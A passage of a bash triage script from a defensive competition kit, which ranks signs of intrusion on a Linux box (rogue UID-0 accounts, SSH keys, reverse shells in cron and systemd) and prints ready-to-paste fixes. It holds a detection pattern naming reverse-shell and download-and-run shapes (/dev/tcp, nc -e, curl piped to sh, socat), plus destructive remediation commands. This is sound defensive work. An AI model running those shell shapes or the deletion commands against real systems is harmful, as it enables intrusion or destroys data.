#!/usr/bin/env bash
set -u

# triage.sh - the first thing you run, and the only one that RANKS.
#
# recon.sh and hunt.sh collect superbly and judge nothing. On the lab box they
# produced 5,359 lines across 22 files, and a real operator working the correct
# sequence found 1 of 3 planted footholds: the one he opened a file to read
# directly. The UID-0 account was one unremarkable row among 105. The
# /dev/tcp reverse shell in /etc/cron.d was line 53 of 4,008.
#
# Nobody reads 4,000 lines while the clock runs. So this does not collect
# anything new - it asks a short list of questions whose answers are almost
# never innocent, and prints only the answers that were not.
#
#   ./triage.sh --config FILE           everything below, ranked
#   ./triage.sh --config FILE --quiet   findings only, no "clean" lines
#   ./triage.sh --config FILE --findings-file ABS_PATH
#                                      atomically write this pass there
#
# READ-ONLY. Safe to run first, safe to run often, safe to run while panicking.
#
# The bar for a check appearing here is: when it fires on a competition box, it
# is wrong far more often than it is fine. A triage tool that cries wolf gets
# ignored by hour two, and then it is worth less than nothing, because you will
# believe you checked.

SCRIPT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
. "$SCRIPT_DIR/lib/common.sh"

umask 077

config=''
quiet=0
__ccdc_triage_cli_findings=''
__ccdc_triage_cli_findings_set=0
while [ "$#" -gt 0 ]; do
  case "$1" in
    --config) config=${2:?missing config path}; shift 2 ;;
    --findings-file)
      [ "$__ccdc_triage_cli_findings_set" -eq 0 ] || ccdc_die "--findings-file may be supplied only once"
      __ccdc_triage_cli_findings=${2:?missing findings path}
      __ccdc_triage_cli_findings_set=1
      shift 2
      ;;
    --quiet) quiet=1; shift ;;
    -h|--help) printf 'usage: %s --config FILE [--quiet] [--findings-file ABS_PATH]\n' "$0"; exit 0 ;;
    *) ccdc_die "unknown argument: $1" ;;
  esac
done
[ -n "$config" ] || ccdc_die "--config is required"
# Preserve command-line precedence even though the selected config is sourced.
readonly __ccdc_triage_cli_findings __ccdc_triage_cli_findings_set
ccdc_load_config "$config"

# Every command this tool PRINTS is meant to be pasted, so it carries the real
# values rather than a placeholder. "<cfg>" is not a placeholder to bash, it is
# a redirect - pasting `--config <cfg>` is a syntax error, which is exactly what
# an operator hit on the lab box. Paths are absolute so they work from any cwd.
printf -v qconfig '%q' "$config"
printf -v qself '%q' "$SCRIPT_DIR/triage.sh"
printf -v qcard '%q' "$SCRIPT_DIR/card.sh"
printf -v qsshd '%q' "$SCRIPT_DIR/sshd.sh"
printf -v qsentry '%q' "$SCRIPT_DIR/sentry.sh"


state_dir=${CCDC_EVIDENCE_DIR:-/var/tmp/ccdc-evidence}
ccdc_validate_state_dir "$state_dir" "CCDC_EVIDENCE_DIR"
case "$state_dir" in */) state_dir=${state_dir%/} ;; esac
mkdir -p "$state_dir" 2>/dev/null \
  || ccdc_die "cannot create triage state directory: $state_dir (run with sudo or fix its ownership)"
[ -w "$state_dir" ] \
  || ccdc_die "triage state is not writable by $(id -un): $state_dir (run with sudo; refusing to split findings)"

findings=0
muted_n=0
checks=0

# Severity is about what it means, not how the check is written:
#   RED    - this is an intrusion until proven otherwise. Act now.
#   AMBER  - legitimate on some boxes, so look, but do not assume.
red()   { findings=$((findings + 1)); printf '\n  \033[1;31mRED\033[0m    %s\n' "$1"; }
amber() { findings=$((findings + 1)); printf '\n  \033[1;33mAMBER\033[0m  %s\n' "$1"; }
detail(){ printf '         %s\n' "$1"; }

# Print the literal command to run, with this box's real values already in it.
#
# The card reference alone was not enough. Watching a real operator work a
# finding, he typed `sudo remove t-implant` - inventing a command - because the
# actual fix was a sed incantation inside a markdown file he was not looking at
# while the clock ran. A reference tells you where to go read; under pressure
# you need the command under your cursor. So triage now prints it.
#
# Nothing here is destructive-by-surprise: the ordering is lock-then-verify-
# then-remove, exactly as the cards describe, and the irreversible step is
# always last and always after something that shows you what you are about to
# remove.
# No "$" prefix. It looked like a prompt and read nicely - and the operator
# selected the block, pasted it, and got:
#
#     $: command not found
#     $: command not found
#
# because the prompt character came along with the text. Bash strips LEADING
# WHITESPACE from a command line, so an indented command pastes and runs
# exactly as written. The "run this" header above carries the meaning the "$"
# was carrying, without being a character the shell has to reject.
fix() { printf '           %s\n' "$1"; }

# Machine-readable findings, written every run alongside the human output.
#
# sentry.sh consumes this instead of re-implementing the checks or scraping the
# pretty output. One detection implementation, two readers - so a check can
# never be fixed here and stay broken there.
#
#   SEVERITY|CHECK|SUBJECT|DESCRIPTION
#
# SUBJECT is the thing to act on: a username, a path, or a documented compound
# value. It is the only field sentry parses for an argument.

# This kit's own payload directories.
#
# guardian's reconcile script legitimately contains the shapes the reverse-shell
# detector hunts for, so on an armed box triage reported its own tooling as RED
# on every pass - three findings that could never be cleared. An unclearable RED
# is worse than a missed one: it teaches you that RED can be ignored.
#
# Excluded here rather than in sentry, because sentry only decides what to TOUCH
# and these were still being reported forever. That tree is not unwatched: the
# guardian hash-pins every file it installs and repairs drift from an
# independent .repair source, which is a stronger check than this grep.
own_payload() {
  local path=$1 g gdir sdir
  g=${CCDC_GUARDIAN_NAME:-node-health}
  gdir=${CCDC_GUARDIAN_DIR:-/usr/local/lib/$g}
  sdir=${CCDC_SENTRY_DIR:-/usr/local/lib/${CCDC_SENTRY_NAME:-node-observer}}
  case "$path" in "$gdir"/*|"$sdir"/*) return 0 ;; esac
  return 1
}

if [ "$__ccdc_triage_cli_findings_set" -eq 1 ]; then
  findings_file=$__ccdc_triage_cli_findings
else
  findings_file=${CCDC_TRIAGE_FINDINGS:-$state_dir/triage.findings}
fi

validate_findings_file() {
  local path=$1 parent base
  case "$path" in /*) ;; *) ccdc_die "findings file must be absolute: $path" ;; esac
  case "$path" in
    *'//'*) ccdc_die "findings file contains an empty path component: $path" ;;
    */./*|*/.|*/../*|*/..) ccdc_die "findings file contains path traversal: $path" ;;
    *[!A-Za-z0-9_./@+-]*) ccdc_die "findings file contains unsupported whitespace, delimiter, or control characters: $path" ;;
  esac
  parent=$(dirname -- "$path")
  base=${path##*/}
  [ "$parent" = "$state_dir" ] \
    || ccdc_die "findings file must be a direct child of CCDC_EVIDENCE_DIR ($state_dir): $path"
  case "$base" in ''|.|..) ccdc_die "findings file has an invalid basename: $path" ;; esac
  [ ! -d "$path" ] || ccdc_die "findings file is a directory: $path"
}

validate_findings_file "$findings_file"
findings_tmp="$state_dir/.triage-findings-write.$$"
if ! (umask 077; set -o noclobber; : >"$findings_tmp") 2>/dev/null; then
  ccdc_die "cannot create a private findings staging file in $state_dir"
fi
cleanup_findings_tmp() {
  [ -z "${findings_tmp:-}" ] || rm -f -- "$findings_tmp" 2>/dev/null || true
}
trap cleanup_findings_tmp EXIT INT TERM HUP

machine_field_safe() {
  # The findings file is deliberately a tiny, dependency-free wire format.
  # Never let an attacker-chosen filename add a field or a second record.
  case "$1" in
    *'|'*|*$'\n'*|*$'\r'*) return 1 ;;
    *) return 0 ;;
  esac
}
machine_pair_safe() {
  # A few checks use SUBJECT=source::target. Keep that inner delimiter just as
  # unambiguous as the outer pipe-separated format.
  machine_field_safe "$1" && machine_field_safe "$2" || return 1
  case "$1"$'\n'"$2" in *'::'*) return 1 ;; esac
  return 0
}
machine_triple_safe() {
  machine_field_safe "$1" && machine_field_safe "$2" && machine_field_safe "$3" || return 1
  case "$1"$'\n'"$2"$'\n'"$3" in *'::'*) return 1 ;; esac
  return 0
}
emitted_keys=$'\n'
emit() {
  # A standing exception the operator recorded with `sentry.sh --mute`. The
  # count is printed at the end of this run and in every ALERTS header, so a
  # muted finding is silenced but never invisible - nothing here can quietly
  # blind the box, including anyone who gets root and edits the file.
  if ccdc_is_muted "$2" "$3"; then
    muted_n=$((muted_n + 1))
    return 0
  fi
  # One row per check and subject. A python pid that both listens and serves
  # an inbound session was emitted twice under one subject, and sentry queued
  # it as items 7 and 8 - the same kill, offered twice.
  case "$emitted_keys" in *$'\n'"$2|$3"$'\n'*) return 0 ;; esac
  emitted_keys="$emitted_keys$2|$3"$'\n'
  if machine_field_safe "$1" && machine_field_safe "$2" &&
     machine_field_safe "$3" && machine_field_safe "$4"; then
    printf '%s|%s|%s|%s\n' "$1" "$2" "$3" "$4" >>"$findings_tmp" \
      || ccdc_die "cannot append to findings staging file: $findings_tmp"
  else
    # Keep the human finding visible, but do not hand an ambiguous subject to
    # sentry for root execution.
    ccdc_warn "omitted a delimiter-unsafe $2 finding from the machine queue; inspect the human triage output"
  fi
}
fixhdr(){ printf '         ---- run this ----------------------------------------\n'; }

. "$SCRIPT_DIR/lib/provenance.sh"


clean() { [ "$quiet" -eq 1 ] || printf '  ok     %s\n' "$1"; }
begin() { checks=$((checks + 1)); }

printf 'triage.sh - what should alarm you on %s, right now\n' "${CCDC_BOX_NAME:-this box}"
printf 'read-only. %s\n\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"

# What `userdel -r` would actually delete, and whether that is survivable.
#
# A backdoor UID-0 account's home directory is very often /root - that is the
# whole point of the account, it IS root. `userdel -r` on one of those deletes
# /root: root's authorized_keys, root's dotfiles, whatever the team put there,
# and any scored content living underneath it.
#
# This is not hypothetical. This function exists because triage.sh printed
#
#     sudo userdel -f -r -- sysmon
#
# an operator pasted it exactly as instructed, and /root was gone from the lab
# box - noticed forty minutes later, and only because a canary that had been
# deployed under /root could not be found. The account was the finding. Its
# home directory was not, and the tool had no business handing out a command
# that removed it.
#
# So: work out where the account lives, and only offer -r when the directory
# belongs to that account alone.
userdel_fix() {
  local user=$1 quser=$2 home shared
  home=$(awk -F: -v u="$user" '$1 == u { print $6 }' /etc/passwd 2>/dev/null)
  if [ -z "$home" ]; then
    fix "sudo userdel -f -- $quser"
    return 0
  fi
  case "$home" in
    /|/root|/etc|/usr|/var|/opt|/srv|/home|/tmp|/boot|/dev|/run|/bin|/sbin|/lib|/nonexistent)
      fix "sudo userdel -f -- $quser                   # NOT -r: home is $home"
      fix "# -r would DELETE $home. Take the account, leave the directory."
      fix "# Then read $home yourself - on a UID-0 backdoor it is usually"
      fix "# root's own home, and what is in it is evidence, not the attacker's."
      return 0 ;;
  esac
  # Another account in the same directory means -r takes THEIR home with it.
  shared=$(awk -F: -v u="$user" -v h="$home" '$1 != u && $6 == h { print $1 }' \
    /etc/passwd 2>/dev/null | tr '\n' ' ')
  if [ -n "$shared" ]; then
    fix "sudo userdel -f -- $quser                   # NOT -r: $home is shared"
    fix "# also the home of: ${shared% }"
    return 0
  fi
  fix "sudo userdel -f -r -- $quser                  # -r also deletes $home"
}

# --- 1. UID 0 accounts that are not root -------------------------------------
# The cheapest persistent root there is, and invisible in `who`, `sudo -l` and
# every "check for new users" habit that looks at UID >= 1000.
begin
uid0=$(awk -F: '$3==0 && $1!="root" {print $1}' /etc/passwd 2>/dev/null)
if [ -n "$uid0" ]; then
  red "account(s) with UID 0 other than root - this IS root access   [CARD 1]"
  for u in $uid0; do emit RED uid0 "$u" "UID 0 account that is not root"; done
  for u in $uid0; do
    detail "$(grep "^$u:" /etc/passwd)"
  done
  detail "confirm against the packet first - a scored account can have a bad UID"
  for u in $uid0; do
    printf -v quser '%q' "$u"
    fixhdr
    fix "sudo passwd -l $quser"
    fix "sudo usermod -s /usr/sbin/nologin $quser"
    fix "ps -ef | grep -w -- $quser | grep -v grep      # kill these by PID, NOT by user"
    userdel_fix "$u" "$quser"
  done
  detail "NEVER pkill -u on a UID-0 account: the name resolves to root and you"
  detail "would kill every root process on the box. See CARD 1."
else
  clean "no UID-0 accounts besides root"
fi

# --- 1b. Scored accounts that have stopped working ---------------------------
#
# From the team training, in as many words: "We have scored users in addition
# to scored services. We have to make sure scoring users are available."
#
# A scored account that has been locked, expired, or had its shell taken away
# costs exactly what a stopped service costs, and until now nothing in this kit
# looked. Every other account check here asks whether an account should NOT be
# able to log in. This one asks whether one that MUST be able to, still can.
#
# It is first for the same reason a stopped scored service is first: it is
# points, not hygiene.
begin
if [ -n "${CCDC_INTERACTIVE_USERS:-}" ]; then
  scored_broken=''
  for u in ${CCDC_INTERACTIVE_USERS:-}; do
    [ "$u" = root ] && continue
    if ! getent passwd "$u" >/dev/null 2>&1; then
      emit RED scoreduser "$u" "account named in the packet no longer exists"
      scored_broken="$scored_broken $u(gone)"
      continue
    fi
    # Locked: passwd -S prints L. The ! or * prefix in the shadow hash means
    # the same thing and is readable without the passwd tool.
    st=$(passwd -S "$u" 2>/dev/null | awk '{print $2}')
    if [ "$st" = "L" ] || [ "$st" = "LK" ]; then
      emit RED scoreduser "$u" "a SCORED account is LOCKED - this is lost uptime right now"
      scored_broken="$scored_broken $u(locked)"
      continue
    fi
    # Expired account, which locks a login just as effectively and is quieter.
    exp=$(chage -l "$u" 2>/dev/null | awk -F: '/Account expires/ {print $2}' | sed 's/^ *//')
    if [ -n "$exp" ] && [ "$exp" != "never" ]; then
      exp_s=$(date -d "$exp" +%s 2>/dev/null || printf '')
      now_s=$(date +%s)
      if [ -n "$exp_s" ] && [ "$exp_s" -lt "$now_s" ]; then
        emit RED scoreduser "$u" "a SCORED account EXPIRED on $exp - it cannot log in"
        scored_broken="$scored_broken $u(expired)"
        continue
      fi
    fi
    # Shell taken away. Legitimate for a service account that is scored only
    # for its service, which is why this one is amber rather than red.
    sh=$(getent passwd "$u" | cut -d: -f7)
    case "$sh" in
      */nologin|*/false)
        emit AMBER scoreduser "$u" "a scored account has login shell $sh - deliberate, or somebody took it away?"
        ;;
    esac
  done
  if [ -n "$scored_broken" ]; then
    red "SCORED account(s) that cannot log in:$scored_broken   [CARD 1]"
    detail "the packet says these have to work. They do not. This is points, not hygiene -"
    detail "fix it before you read another line of this report."
    fixhdr
    # Named per account, never with a USER placeholder: the operator should be
    # able to paste the line without translating it, and a placeholder is a
    # translation step performed under time pressure.
    for u in $scored_broken; do
      name=${u%%(*}
      printf -v qu '%q' "$name"
      fix "sudo passwd -u $qu && sudo chage -E -1 $qu && getent passwd $qu"
    done
    fix "# unlock, clear any expiry, then read back the line to confirm the shell"
  else
    clean "every account named in CCDC_INTERACTIVE_USERS can still log in"
  fi
else
  clean "interactive scored-account check skipped (set CCDC_INTERACTIVE_USERS only when the packet requires a login)"
fi

# --- 2. Accounts with no password --------------------------------------------
begin
if [ -r /etc/shadow ]; then
  empty=$(awk -F: '($2=="" ) {print $1}' /etc/shadow 2>/dev/null)
  if [ -n "$empty" ]; then
    red "account(s) with an EMPTY password: $(printf '%s' "$empty" | tr '\n' ' ')   [CARD 1]"
    for u in $empty; do emit RED emptypw "$u" "account with an empty password"; done
    detail "anyone who can reach a login prompt is already in"
    for u in $empty; do
      printf -v quser '%q' "$u"
      fixhdr
      fix "sudo passwd -l $quser"
      fix "sudo usermod -s /usr/sbin/nologin $quser"
      fix "sudo pkill -9 -u $quser                     # safe here: this is NOT UID 0"
      fix "# only if the packet says this account is not scored:"
      userdel_fix "$u" "$quser"
    done
  else
    clean "no empty-password accounts"
  fi
else
  clean "/etc/shadow unreadable (run with sudo for the password checks)"
fi

# --- 3. SSH authorized_keys ---------------------------------------------------
# Never "clean": every key is access, so every key has to be one you recognise.
# The operator who found this one in the drill found it because he opened the
# file. This makes opening the file unnecessary.
begin
keyfiles=()
add_keyfile() {
  local candidate=$1 existing
  [ -f "$candidate" ] || return 0
  for existing in "${keyfiles[@]}"; do
    [ "$existing" = "$candidate" ] && return 0
  done
  keyfiles+=("$candidate")
}
passwd_records() {
  if ccdc_have getent && getent passwd 2>/dev/null; then
    return 0
  fi
  cat /etc/passwd 2>/dev/null
}

# Account homes are not confined to /home. Service identities commonly live
# below /var/lib, and a key there grants the same access as one in /root. Use
# the system account database so LDAP/NSS-backed accounts are covered too.
while IFS=: read -r _ _ _ _ _ home _; do
  case "$home" in /*) add_keyfile "$home/.ssh/authorized_keys" ;; esac
done < <(passwd_records)

# Retain the old filesystem sweep as well: it catches orphaned /home trees
# that no longer have a passwd entry but still contain a usable key.
while IFS= read -r -d '' f; do add_keyfile "$f"; done \
  < <(find /root /home -maxdepth 3 -name authorized_keys -type f -print0 2>/dev/null)

if [ "${#keyfiles[@]}" -gt 0 ]; then
  total=0
  for f in "${keyfiles[@]}"; do
    # `grep -c` PRINTS 0 and EXITS 1 when there are no matches, so a
    # `|| printf 0` fallback appends a second 0 and the test below then dies
    # with "integer expression expected". Check for empty instead.
    n=$(grep -c '^[[:space:]]*[^#[:space:]]' "$f" 2>/dev/null)
    [ -n "$n" ] || n=0
    [ "$n" -gt 0 ] && total=$((total + n))
  done
  if [ "$total" -gt 0 ]; then
    amber "$total SSH key(s) grant login. Recognise EVERY one or remove it   [CARD 2]"
    sshkey_fix=1
    for f in "${keyfiles[@]}"; do
      n=$(grep -c '^[[:space:]]*[^#[:space:]]' "$f" 2>/dev/null)
      [ -n "$n" ] || n=0
      [ "$n" -gt 0 ] && emit AMBER sshkey "$f" "SSH keys grant login here"
    done
    for f in "${keyfiles[@]}"; do
      [ -s "$f" ] || continue
      if newer_than_box "$f"; then
        detail "$f - written $(date -d "@$(stat -c '%Y' "$f" 2>/dev/null)" '+%Y-%m-%d %H:%M' 2>/dev/null), AFTER this box was built"
      fi
    done
    fixhdr
    for f in "${keyfiles[@]}"; do
      while IFS= read -r k; do
        [ -n "$k" ] || continue
        detail "$(printf '%s' "$f"): ...$(printf '%s' "$k" | tail -c 45)"
        # A ready-to-run deletion for THIS key, matched on the LAST 24 chars
        # of the key body.
        #
        # It must be the tail. The first 24 characters are the algorithm
        # prefix - every ed25519 key begins "AAAAC3NzaC1lZDI1NTE5AAAA" - so a
        # leading slice matches EVERY key of that type and the command would
        # empty the file, locking you out. Caught on the lab box only because
        # the generated command was read before it was run.
        #
        # The | delimiter is also deliberate: base64 contains / and would
        # terminate a /.../ expression early.
        slice=$(printf '%s' "$k" | awk '{print $2}' | tail -c 25 | tr -d '\n')
        if [ -n "$slice" ]; then
          case "$slice" in
            *[!A-Za-z0-9+/=]*)
              detail "key line is malformed; edit this file manually (no generated delete command)"
              continue
              ;;
          esac
          printf -v qf '%q' "$f"
          printf -v qbak '%q' "$f.bak"
          # Single-quoted, not %q. `printf %q` produced \\\| ... \| which is
          # correct bash and round-trips perfectly - and which an operator read
          # as a corrupted command and declined to run, which makes it useless.
          # A command nobody will paste is not remediation.
          fix "sudo cp -- $qf $qbak && sudo sed -i '\\|$slice|d' $qf"
        fi
      done < <(grep '^[[:space:]]*[^#[:space:]]' "$f" 2>/dev/null)
    done
    detail "delete ONLY the lines you do not recognise - never truncate the file,"
    detail "your own key is probably in it. Keep this session open, then verify:"
    # The account you are logged in as, not a name from the lab this was
    # written on: printed as "ssh banneluk@..." it was wrong on every other box.
    login_user=${SUDO_USER:-$(id -un)}
    fix "sudo sshd -t && ssh $login_user@\$(hostname -I | awk '{print \$1}')   # from ANOTHER terminal"
  else
    clean "no SSH authorized_keys entries"
  fi
else
  clean "no authorized_keys files"
fi

# --- 4. Scheduled jobs that call home ----------------------------------------
# Not "is there a cron entry" - there are always cron entries, and that is why
# the real one hid in 4,008 lines. This asks whether a scheduled job contains
# the shapes that only ever mean a shell.
begin
# `nc -z HOST PORT` is a normal, non-interactive liveness probe.  Netcat only
# belongs in this shell-payload pattern when it is told to execute a command;
# treating every option as a reverse shell made the kit condemn its own scored
# service health check on the lab VM.
shells='/dev/tcp|/dev/udp|(^|[[:space:];|])(nc|ncat|netcat)[[:space:]]+([^[:space:]]+[[:space:]]+)*(-e|-c|--exec|--sh-exec)([[:space:]]|$)|bash -i|sh -i|curl .*\| *(ba)?sh|wget .*\| *(ba)?sh|base64 -d|python.? -c|perl -e|socat'

# Print conservative, delimiter-safe absolute-path tokens from a command line.
# This intentionally declines paths containing whitespace or shell metacharacters
# instead of trying to emulate either cron's or systemd's command parser.
absolute_tokens() {
  LC_ALL=C grep -oE '/[A-Za-z0-9._+@%~-]+(/[A-Za-z0-9._+@%~-]+)*' 2>/dev/null || true
}

# Commands that launch another command/script rather than being the payload
# themselves. For these, inspect absolute regular-file arguments as well as the
# first executable. No command text is ever evaluated.
is_launch_wrapper() {
  case "${1##*/}" in
    sh|bash|dash|zsh|ksh|python|python[0-9]*|perl|ruby|php|node|env|nohup|setsid|\
    timeout|nice|ionice|chrt|stdbuf|flock|sudo|su|runuser|busybox|daemonize|\
    start-stop-daemon) return 0 ;;
    *) return 1 ;;
  esac
}

cronhits=$(grep -rIlE "$shells" /etc/cron.d /etc/cron.daily /etc/cron.hourly \
  /etc/cron.weekly /etc/cron.monthly /etc/crontab /var/spool/cron 2>/dev/null)
if [ -n "$cronhits" ]; then
  red "scheduled job(s) containing reverse-shell or download-and-run patterns   [CARD 3]"
  for f in $cronhits; do emit RED cron "$f" "scheduled job containing a reverse shell"; done
  for f in $cronhits; do
    detail "$f"
    while IFS= read -r l; do
      detail "    $(printf '%s' "$l" | cut -c1-96)"
    done <<EOF
$(grep -IhE "$shells" "$f" 2>/dev/null | head -3)
EOF
    printf -v qf '%q' "$f"
    printf -v qevidence '%q' "/var/tmp/evidence-$(basename -- "$f")"
    fixhdr
    fix "sudo cp -- $qf $qevidence   # keep it, the IR inject wants it"
    fix "sudo rm -f -- $qf"
  done
  detail "then follow what it CALLED - the cron line is the schedule, not the payload:"
  fix "sudo ss -tnp | grep -v 127.0.0.1        # is it connected right now?"
else
  clean "no scheduled job matches a reverse-shell pattern"
fi

# The cron entry can be clean while the executable it names contains the
# payload. Follow one hop through absolute targets, including a non-executable
# script passed to a known interpreter/wrapper. This catches, for example,
# `root /usr/local/bin/net-check` and `/bin/bash /opt/check.sh` without sourcing
# or executing attacker-controlled text.
begin
cron_sources=()
add_cron_source() {
  local candidate=$1 existing
  [ -f "$candidate" ] || return 0
  for existing in "${cron_sources[@]}"; do
    [ "$existing" = "$candidate" ] && return 0
  done
  cron_sources+=("$candidate")
}
add_cron_source /etc/crontab
for cron_root in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly \
                 /etc/cron.monthly /var/spool/cron; do
  [ -d "$cron_root" ] || continue
  while IFS= read -r -d '' f; do add_cron_source "$f"; done \
    < <(find "$cron_root" -type f -print0 2>/dev/null)
done

crondeep=()
for source in "${cron_sources[@]}"; do
  while IFS= read -r line || [ -n "$line" ]; do
    trimmed=${line#"${line%%[![:space:]]*}"}
    case "$trimmed" in ''|'#'*) continue ;; esac
    # Cron environment assignments are data, not launch commands. Ignoring
    # them avoids following PATH/SHELL values as if cron executed each path.
    printf '%s\n' "$trimmed" | grep -qE '^[A-Za-z_][A-Za-z0-9_]*[[:space:]]*=' && continue

    targets=()
    while IFS= read -r target; do
      [ -n "$target" ] && targets+=("$target")
    done < <(printf '%s\n' "$trimmed" | absolute_tokens)
    [ "${#targets[@]}" -gt 0 ] || continue
    # A stepped cron field such as */5 looks like the absolute token `/5`.
    # Anchor wrapper/direct-target decisions to the first token that is an
    # actual regular file, not merely the first slash-shaped substring.
    primary=''
    for target in "${targets[@]}"; do
      if [ -f "$target" ]; then primary=$target; break; fi
    done
    [ -n "$primary" ] || continue

    for target in "${targets[@]}"; do
      [ -f "$target" ] || continue
      # A direct executable is a launch target. A known wrapper/interpreter
      # also makes its regular-file arguments launch targets.
      if [ "$target" != "$primary" ] && [ ! -x "$target" ] && ! is_launch_wrapper "$primary"; then
        continue
      fi
      own_payload "$target" && continue
      grep -qIE "$shells" "$target" 2>/dev/null || continue
      hit="$source::$target"
      duplicate=0
      for existing in "${crondeep[@]}"; do
        [ "$existing" = "$hit" ] && duplicate=1 && break
      done
      [ "$duplicate" -eq 1 ] || crondeep+=("$hit")
    done
  done <"$source"
done

if [ "${#crondeep[@]}" -gt 0 ]; then
  red "scheduled job(s) launching a file that contains a reverse shell   [CARD 3]"
  detail "the schedule looks clean - the payload is one level down"
  for e in "${crondeep[@]}"; do
    source=${e%%::*}; target=${e#*::}
    detail "$source -> $target"
    if machine_pair_safe "$source" "$target"; then
      emit RED crondeep "$e" "scheduled job launching a file containing a reverse shell"
    else
      ccdc_warn "omitted an ambiguous crondeep subject from the machine queue; inspect the human triage output"
    fi
    while IFS= read -r l; do detail "    $(printf '%s' "$l" | cut -c1-88)"; done \
      < <(grep -IhE "$shells" "$target" 2>/dev/null | head -2)
    printf -v qsource '%q' "$source"
    printf -v qtarget '%q' "$target"
    printf -v qsource_evidence '%q' "/var/tmp/evidence-cron-$(basename "$source")"
    printf -v qtarget_evidence '%q' "/var/tmp/evidence-payload-$(basename "$target")"
    fixhdr
    fix "sudo cp -- $qsource $qsource_evidence"
    fix "sudo cp -- $qtarget $qtarget_evidence"
    fix "sudo nano $qsource      # delete only the schedule line that names $qtarget"
    fix "sudo rm -f -- $qtarget"
  done
else
  clean "no scheduled job launches a file containing a reverse shell"
fi

# --- 5. systemd units that call home -----------------------------------------
begin
unithits=$(grep -rIlE "$shells" /etc/systemd/system /run/systemd/system 2>/dev/null)
if [ -n "$unithits" ]; then
  red "systemd unit(s) containing reverse-shell or download-and-run patterns   [CARD 4]"
  for f in $unithits; do
    case "$f" in
      *.service.d/*.conf|*.timer.d/*.conf)
        parent=$(basename -- "$(dirname -- "$f")")
        owner=${parent%.d}
        if machine_pair_safe "$owner" "$f"; then
          emit RED unitdropin "$owner::$f" "drop-in containing a reverse shell"
        else
          ccdc_warn "omitted an ambiguous unitdropin subject from the machine queue; inspect the human triage output"
        fi
        ;;
      *) emit RED unit "$f" "unit containing a reverse shell" ;;
    esac
  done
  for f in $unithits; do
    detail "$f"
    case "$f" in
      *.service.d/*.conf|*.timer.d/*.conf)
        parent=$(basename -- "$(dirname -- "$f")")
        u=${parent%.d}
        printf -v qf '%q' "$f"
        printf -v qunit_name '%q' "$u"
        printf -v qevidence '%q' "/var/tmp/evidence-$(basename -- "$f")"
        fixhdr
        fix "sudo systemctl cat -- $qunit_name                  # read the merged unit before changing it"
        fix "sudo cp -- $qf $qevidence"
        fix "sudo rm -f -- $qf                         # remove only the malicious drop-in"
        fix "sudo systemctl daemon-reload && sudo systemctl try-restart -- $qunit_name"
        continue
        ;;
    esac
    u=$(basename -- "$f")
    printf -v qf '%q' "$f"
    printf -v qdropdir '%q' "$f.d"
    printf -v qunit_name '%q' "$u"
    fixhdr
    fix "sudo systemctl cat -- $qunit_name                  # read it before you delete it"
    fix "sudo systemctl disable --now -- $qunit_name"
    fix "sudo rm -f -- $qf && sudo rm -rf -- $qdropdir      # .d holds drop-in overrides"
    fix "sudo systemctl daemon-reload && sudo systemctl reset-failed"
  done
else
  clean "no systemd unit matches a reverse-shell pattern"
fi

# Units executing out of a world-writable directory are a separate tell: the
# path is the finding, whatever the command looks like.
begin
tmpunits=$(grep -rIlE '^Exec[A-Za-z]*=.*(/tmp/|/var/tmp/|/dev/shm/)' \
  /etc/systemd/system /run/systemd/system 2>/dev/null)
if [ -n "$tmpunits" ]; then
  red "systemd unit(s) executing from a world-writable directory   [CARD 4]"
  for f in $tmpunits; do
    case "$f" in
      *.service.d/*.conf|*.timer.d/*.conf)
        parent=$(basename -- "$(dirname -- "$f")")
        owner=${parent%.d}
        if machine_pair_safe "$owner" "$f"; then
          emit RED unitdropin "$owner::$f" "drop-in executing from a world-writable directory"
        else
          ccdc_warn "omitted an ambiguous unitdropin subject from the machine queue; inspect the human triage output"
        fi
        ;;
      *) emit RED unittmp "$f" "unit executing from a world-writable directory" ;;
    esac
  done
  for f in $tmpunits; do
    detail "$f"
    printf -v qf '%q' "$f"
    unit_name=$(basename -- "$f")
    printf -v qunit '%q' "${unit_name%.conf}"
    fixhdr
    fix "systemctl cat -- $qunit                     # read it BEFORE you stop it"
    fix "sudo cp -p -- $qf $(printf '%q' "$state_dir")/   # keep the unit file"
    fix "sudo systemctl disable --now -- $qunit      # stop it and unhook it from boot"
    fix "sudo rm -- $qf && sudo systemctl daemon-reload"
    fix "# the ExecStart target is a SEPARATE artifact - remove that too:"
    fix "grep -h '^Exec' -- $qf"
  done
else
  clean "no systemd unit executes from /tmp, /var/tmp or /dev/shm"
fi

# Is this unit one the packet says we are scored on, or one we told the kit to
# protect? Matched on the bare name so "scored-web", "scored-web.service" and a
# full path all agree.
#
# This exists because the first version of the check below offered
#
#     sudo systemctl disable --now -- scored-web.service
#     sudo cp -p -- /etc/systemd/system/scored-web.service ... && sudo rm -- ...
#
# in the same paste-ready block as the rogue timer. The scored service's unit
# was hand-installed on the lab box, so it is genuinely unpackaged and genuinely
# newer than the image - it matches the detection perfectly, and the detection
# is right. What was wrong was printing a removal for it. Third time a
# remediation list has included something that must never be run, so: the guard
# lives in the listing, not in the operator's memory.
unit_is_ours() {
  local needle=${1##*/} item
  needle=${needle%.service}; needle=${needle%.timer}
  needle=${needle%.socket}; needle=${needle%.path}
  for item in ${CCDC_SCORED_UNITS:-} ${CCDC_SYSTEMD_SERVICES:-} \
              ${CCDC_PROTECT_SERVICES:-} ${CCDC_DISABLE_SERVICES:-}; do
    item=${item##*/}; item=${item%.service}; item=${item%.timer}
    item=${item%.socket}; item=${item%.path}
    [ "$item" = "$needle" ] && return 0
  done
  return 1
}

# --- 5c. Unit files nothing shipped and nobody here installed ------------------
#
# The three unit checks above are all CONTENT checks: does the unit match a
# reverse-shell pattern, does it execute out of /tmp, does its ExecStart script
# contain a shell. A timer named sysstat-collect, running a script in
# /usr/local/sbin that appends a date to a file, passes all three - and
# sysstat is a real Ubuntu package with real timers, so the name survives a
# glance at `systemctl list-timers`.
#
# On the lab box that timer was invisible to triage for everything except the
# "/etc changed in the last 30 minutes" check, which aged out after half an
# hour and took the only mention of it with it. hunt.sh did record it, in a
# 154 KB persistence.txt, which is evidence rather than a finding.
#
# What does not age out and does not depend on the payload being recognisable:
# no package shipped this unit, and it is newer than the box. That is the same
# pair of questions the drop-in and SUID checks ask, because on a machine you
# were handed an hour ago it is the only pair you can answer.
begin
unit_rogue=''
unit_ours=''
# /run/systemd/system is deliberately NOT scanned, and the reason is worth
# stating because it looks like an omission.
#
# It is tmpfs, and it is where systemd GENERATORS write - netplan, the fstab
